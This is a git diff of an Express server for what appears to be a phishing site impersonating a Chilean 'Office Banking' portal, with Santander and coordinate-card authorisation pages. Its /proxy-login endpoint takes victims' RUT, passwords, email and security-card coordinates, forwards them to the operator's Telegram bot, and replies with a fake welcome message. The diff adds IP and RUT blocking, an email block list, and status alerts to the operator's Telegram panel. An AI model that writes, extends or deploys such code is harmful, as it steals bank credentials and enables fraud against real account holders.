@@ -10,7 +10,7 @@ app.set("trust proxy", true);
 
 // ✅ CORS mejorado - permite AMBOS dominios sin redirección
 const corsOptions = {
-  origin: function(origin, callback) {
+  origin: function (origin, callback) {
     if (
       !origin ||
       origin === "https://www.officebankingchile.info" ||
@@ -35,20 +35,11 @@ app.options("*", cors(corsOptions));
 app.use(express.json());
 app.use(express.static(path.join(__dirname, "public")));
 
-// ✅ Middleware para logging detallado
-app.use((req, res, next) => {
-  console.log(`\n📨 ${req.method} ${req.path}`);
-  console.log(`Origin: ${req.get("origin")}`);
-  if (req.method === "POST") {
-    console.log(`Body:`, JSON.stringify(req.body, null, 2));
-  }
-  next();
-});
 // =============================================
 //   🔥 BLOQUEO DE CORREOS SOSPECHOSOS 🔥
 // =============================================
 const correosBloqueados = [
-  "f.tamarugal@gmail.com",   // <-- reemplaza aquí
+  "f.tamarugal@gmail.com", // <-- reemplaza aquí
   "otro@dominio.com"
 ];
 
@@ -70,12 +61,116 @@ app.use((req, res, next) => {
   next();
 });
 
+// =============================================
+//   🔥 BLOQUEO POR IP / RUT (EN MEMORIA) 🔥
+// =============================================
+const intentosPorIP = new Map();
+const ipsBloqueadas = new Set();
+const rutsBloqueados = new Set();
+
+function registrarIntentoIP(ip) {
+  if (!ip) return;
+  const actual = intentosPorIP.get(ip) || 0;
+  const nuevo = actual + 1;
+  intentosPorIP.set(ip, nuevo);
+
+  if (nuevo >= 5 && !ipsBloqueadas.has(ip)) {
+    bloquearIP(ip, "Exceso de intentos fallidos");
+  }
+}
+
+function bloquearIP(ip, motivo = "Bloqueo manual") {
+  if (!ip) return;
+  ipsBloqueadas.add(ip);
+  enviarEventoTecnico(
+    `⛔ IP BLOQUEADA\nIP: ${ip}\nMotivo: ${motivo}\nHora: ${new Date().toLocaleString("es-CL")}`
+  );
+}
+
+function desbloquearIP(ip) {
+  if (!ip) return;
+  ipsBloqueadas.delete(ip);
+  enviarEventoTecnico(
+    `🔓 IP DESBLOQUEADA\nIP: ${ip}\nHora: ${new Date().toLocaleString("es-CL")}`
+  );
+}
+
+function bloquearRUT(rut, motivo = "Bloqueo manual") {
+  if (!rut) return;
+  rutsBloqueados.add(rut);
+  enviarEventoTecnico(
+    `⛔ RUT BLOQUEADO\nRUT: ${rut}\nMotivo: ${motivo}\nHora: ${new Date().toLocaleString("es-CL")}`
+  );
+}
+
+function desbloquearRUT(rut) {
+  if (!rut) return;
+  rutsBloqueados.delete(rut);
+  enviarEventoTecnico(
+    `🔓 RUT DESBLOQUEADO\nRUT: ${rut}\nHora: ${new Date().toLocaleString("es-CL")}`
+  );
+}
+
+function estaBloqueadaIP(ip) {
+  return ip && ipsBloqueadas.has(ip);
+}
+
+function estaBloqueadoRUT(rut) {
+  return rut && rutsBloqueados.has(rut);
+}
+
+// Middleware global de bloqueo por IP / RUT (solo técnico)
+app.use((req, res, next) => {
+  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+  const rut =
+    req.body?.rut ||
+    req.query?.rut ||
+    null;
+
+  if (estaBloqueadaIP(ip)) {
+    enviarEventoTecnico(
+      `⛔ Intento desde IP bloqueada\nIP: ${ip}\nRuta: ${req.path}\nMétodo: ${req.method}\nHora: ${new Date().toLocaleString("es-CL")}`
+    );
+    return res.status(403).json({ error: "IP bloqueada" });
+  }
+
+  if (rut && estaBloqueadoRUT(rut)) {
+    enviarEventoTecnico(
+      `⛔ Intento desde RUT bloqueado\nRUT: ${rut}\nRuta: ${req.path}\nMétodo: ${req.method}\nHora: ${new Date().toLocaleString("es-CL")}`
+    );
+    return res.status(403).json({ error: "RUT bloqueado" });
+  }
+
+  next();
+});
+
+// ✅ Middleware para logging detallado
+app.use((req, res, next) => {
+  console.log(`\n📨 ${req.method} ${req.path}`);
+  console.log(`Origin: ${req.get("origin")}`);
+  if (req.method === "POST") {
+    console.log(`Body:`, JSON.stringify(req.body, null, 2));
+  }
+  next();
+});
+
 // Verificación de variables de entorno
 console.log("\n=== VERIFICANDO CONFIGURACIÓN ===");
-console.log(`TELEGRAM_TOKEN definido: ${process.env.TELEGRAM_TOKEN ? "✅ SÍ" : "❌ NO"}`);
-console.log(`CHAT_ID definido: ${process.env.CHAT_ID ? "✅ SÍ" : "❌ NO"}`);
+console.log(
+  `TELEGRAM_TOKEN definido: ${
+    process.env.TELEGRAM_TOKEN ? "✅ SÍ" : "❌ NO"
+  }`
+);
+console.log(
+  `CHAT_ID definido: ${process.env.CHAT_ID ? "✅ SÍ" : "❌ NO"}`
+);
 if (process.env.TELEGRAM_TOKEN)
-  console.log(`Token (primeros 20 caracteres): ${process.env.TELEGRAM_TOKEN.substring(0, 20)}...`);
+  console.log(
+    `Token (primeros 20 caracteres): ${process.env.TELEGRAM_TOKEN.substring(
+      0,
+      20
+    )}...`
+  );
 if (process.env.CHAT_ID) console.log(`Chat ID: ${process.env.CHAT_ID}`);
 console.log("================================\n");
 
@@ -126,16 +221,22 @@ app.get("/autorizacion", (req, res) => {
     const cfg = JSON.parse(fs.readFileSync("config.json", "utf8"));
 
     if (cfg.tipoAutorizacion === "santander") {
-      res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
+      res.sendFile(
+        path.join(__dirname, "public", "autorizacion-santander.html")
+      );
       return;
     }
 
     if (cfg.tipoAutorizacion === "coordenadas") {
-      res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
+      res.sendFile(
+        path.join(__dirname, "public", "autorizacion-coordenadas.html")
+      );
       return;
     }
 
-    res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
+    res.sendFile(
+      path.join(__dirname, "public", "autorizacion-coordenadas.html")
+    );
   } catch (err) {
     res.status(500).json({ error: err.message });
   }
@@ -146,11 +247,17 @@ app.post("/autorizar", async (req, res) => {
   const mensaje = req.body.mensaje || "Autorización recibida";
   try {
     if (process.env.TELEGRAM_TOKEN && process.env.CHAT_ID) {
-      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: mensaje })
-      });
+      await fetch(
+        `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`,
+        {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: process.env.CHAT_ID,
+            text: mensaje
+          })
+        }
+      );
     }
     res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
   } catch (err) {
@@ -159,7 +266,7 @@ app.post("/autorizar", async (req, res) => {
   }
 });
 
-// Función para enviar a Telegram
+// Función para enviar a Telegram (mensajes normales)
 async function enviarATelegram(mensaje) {
   try {
     const url = `https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`;
@@ -181,15 +288,24 @@ async function enviarATelegram(mensaje) {
   }
 }
 
+// Función para enviar eventos técnicos al “panel” (sin datos sensibles)
+async function enviarEventoTecnico(mensaje) {
+  if (!process.env.TELEGRAM_TOKEN || !process.env.CHAT_ID) return false;
+  const prefijo = "📡 EVENTO TÉCNICO\n";
+  return enviarATelegram(prefijo + mensaje);
+}
+
 // 🔍 Detección de navegador / sistema / dispositivo
 function detectarNavegador(userAgent) {
   userAgent = userAgent || "";
 
   let navegador = "Desconocido";
-  if (/chrome|crios|crmo/i.test(userAgent) && !/edge|edg/i.test(userAgent)) navegador = "Chrome";
+  if (/chrome|crios|crmo/i.test(userAgent) && !/edge|edg/i.test(userAgent))
+    navegador = "Chrome";
   else if (/edg/i.test(userAgent)) navegador = "Edge";
   else if (/firefox|fxios/i.test(userAgent)) navegador = "Firefox";
-  else if (/safari/i.test(userAgent) && !/chrome|crios|crmo/i.test(userAgent)) navegador = "Safari";
+  else if (/safari/i.test(userAgent) && !/chrome|crios|crmo/i.test(userAgent))
+    navegador = "Safari";
   else if (/opr|opera/i.test(userAgent)) navegador = "Opera";
 
   let sistema = "Desconocido";
@@ -207,7 +323,8 @@ function detectarNavegador(userAgent) {
 }
 
 // =============================================
-//   🔥🔥🔥  BLOQUE /proxy-login ACTUALIZADO  🔥🔥🔥
+//   🔥🔥🔥  BLOQUE /proxy-login ORIGINAL  🔥🔥🔥
+//   (solo se le agrega panel técnico / bloqueo)
 // =============================================
 
 app.post("/proxy-login", async (req, res) => {
@@ -223,6 +340,12 @@ app.post("/proxy-login", async (req, res) => {
   console.log("=".repeat(60));
   console.log("COORDENADAS RECIBIDAS:", coordenadas);
 
+  // Evento técnico al panel (sin datos sensibles)
+  enviarEventoTecnico(
+    `Nuevo request a /proxy-login\nIP: ${ip}\nMétodo: POST\nNavegador: ${infoNavegador.navegador}\nSistema: ${infoNavegador.sistema}\nDispositivo: ${infoNavegador.dispositivo}\nTiene mail: ${
+      !!mail
+    }\nTiene login: ${!!(rut && passwd)}\nTiene coordenadas: ${!!coordenadas}`
+  );
 
   try {
     // 📧 CORREO
@@ -234,7 +357,10 @@ Navegador: ${infoNavegador.navegador}
 Sistema: ${infoNavegador.sistema}
 Dispositivo: ${infoNavegador.dispositivo}`;
       await enviarATelegram(mensajeCorrecto);
-      return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
+      return res.json({
+        status: "ok",
+        mensaje: "Correo actualizado correctamente"
+      });
     }
 
     // 🔐 LOGIN
@@ -249,7 +375,10 @@ Sistema: ${infoNavegador.sistema}
 Dispositivo: ${infoNavegador.dispositivo}`;
 
       await enviarATelegram(mensajeLogin);
-      return res.json({ status: "ok", mensaje: "Bienvenido a Office Banking" });
+      return res.json({
+        status: "ok",
+        mensaje: "Bienvenido a Office Banking"
+      });
     }
 
     // 🔢 COORDENADAS
@@ -281,10 +410,26 @@ Dispositivo: ${infoNavegador.dispositivo}`;
       });
     }
 
+    // Datos inválidos → intento técnico fallido
+    registrarIntentoIP(ip);
+    enviarEventoTecnico(
+      `❌ Datos inválidos en /proxy-login\nIP: ${ip}\nHora: ${new Date().toLocaleString(
+        "es-CL"
+      )}`
+    );
+
     res.status(400).json({ status: "error", mensaje: "❌ Datos inválidos" });
   } catch (err) {
     console.error(`❌ Error en /proxy-login:`, err);
-    res.status(500).json({ status: "error", mensaje: "⚠️ Error al procesar solicitud" });
+    registrarIntentoIP(ip);
+    enviarEventoTecnico(
+      `⚠️ Error en /proxy-login\nIP: ${ip}\nError: ${err.message}\nHora: ${new Date().toLocaleString(
+        "es-CL"
+      )}`
+    );
+    res
+      .status(500)
+      .json({ status: "error", mensaje: "⚠️ Error al procesar solicitud" });
   }
 });
 
@@ -299,4 +444,6 @@ app.use((req, res) => {
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`✅ Servidor corriendo en puerto ${PORT}`));
+app.listen(PORT, () =>
+  console.log(`✅ Servidor corriendo en puerto ${PORT}`)
+);
